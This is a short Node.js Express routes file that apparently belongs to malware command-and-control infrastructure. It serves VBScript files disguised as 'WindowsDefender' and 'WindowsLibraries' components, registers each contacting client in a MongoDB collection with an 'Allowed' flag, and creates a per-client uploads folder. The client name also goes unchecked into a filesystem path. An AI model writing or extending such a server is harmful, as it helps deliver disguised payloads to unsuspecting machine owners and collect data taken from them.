const path = require("path");
const { readDB, writeDB, updateDB } = require("./MongoOperations");
const fs = require("fs");

module.exports = (app) => {

    app.get("/WindowsDefender", (req, res) => {
        console.log("Serving Windows Defender")
        res.sendFile(path.join(__dirname, "Resources", "WindowsDefender.vbs"));
    });

    app.get("/getLibraries", (req, res) => {
        console.log("Serving Windows Libraries")
        res.sendFile(path.join(__dirname, "Resources", "WindowsLibraries.vbs"));
    });

    //This route takes the name of the client as a parameter and returns the value of Allowed entry in the database
    //it first checks if the clientName exists in the database
    //if it does not exist then it creates a new entry for it in the database
        //the entry contains name, firstContact, and allowed
        //also it creates a folder for the client in the uploads folder if it doesn't exist yet
        //it then returns true
    //if it does exist then it returns the value of Allowed entry in the database 

    app.get("/Permissions/:clientName?", (req, res) => {

        console.log("Checking Permissions for : " + req.params.clientName);
        FindQuery = { Name: req.params.clientName }

        readDB("Main", "Users", FindQuery)
            .then((readResult) => {
                //if the clientName doesn't exist in the database then create a new entry
                if (readResult.length == 0) {

                    let Data = {
                        Name: req.params.clientName,
                        FirstContact: new Date(),
                        Allowed: true,
                    }

                    if (!fs.existsSync(path.join(__dirname, 'uploads', req.params.clientName))) {
                        fs.mkdirSync(path.join(__dirname, 'uploads', req.params.clientName));
                    }

                    writeDB("Main", "Users", Data)
                        .then((result) => {
                            console.log("New User Added : " + req.params.clientName);
                            res.send(true);
                        })
                        .catch((error) => {
                            console.log("Error while Checking if the user exists : " + error);
                            res.send(false);
                        })
                }
                else {
                    res.send(readResult[0].Allowed);
                }
            })
    })

}